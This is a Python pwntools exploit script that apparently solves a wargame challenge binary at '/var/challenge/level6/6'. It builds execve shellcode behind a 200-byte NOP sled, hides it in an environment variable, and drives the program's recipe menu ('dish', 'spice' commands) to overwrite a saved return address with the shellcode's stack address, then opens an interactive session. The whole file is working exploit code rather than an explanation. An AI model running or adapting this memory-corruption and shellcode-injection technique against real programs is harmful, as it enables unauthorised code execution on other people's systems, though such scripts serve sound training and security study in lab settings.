#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /var/challenge/level6/6
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF(args.EXE or './6AAAAAAA')
exe = context.binary = ELF(args.EXE or '/var/challenge/level6/6')

l33tpath = '/usr/local/bin/l33t'
shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
nop_sled = b'\x90' * 200
shellcode = nop_sled + shellcode

# Start with a custom empty env
env = {
    "SHOULD_NOT_SEE": "yes",
    "L33T": "A" * len(shellcode), # when run with GDB, bytes give an error so replace with a string of the same length to reproduce env
}

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        env['L33T'] = shellcode
        return process([exe.path] + argv, *a, **kw, env=env)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled

# The return address location to overwrite (from GDB inspection)
return_addr = (0x7fffffffec48)

# The address of the shellcode in the environment
shellcode_addr = p64(0x7fffffffeec8 + 50)[:6] # + 50 to jump over the "L33T=" part of the env variable, and ignore the last 2 null bytes which are already null when copied correctly

io = start()

# create a new dish
io.sendline("n")
# # add meat
io.sendline("a 1")
# # add cinamon (spice)
io.sendline("a 6")
# # change the spice caloric count to the return address
io.sendline("c 6=" + str(return_addr))
# # change the spice effect to the shellcode address
io.sendline(b"e 6=" + shellcode_addr)

io.interactive()

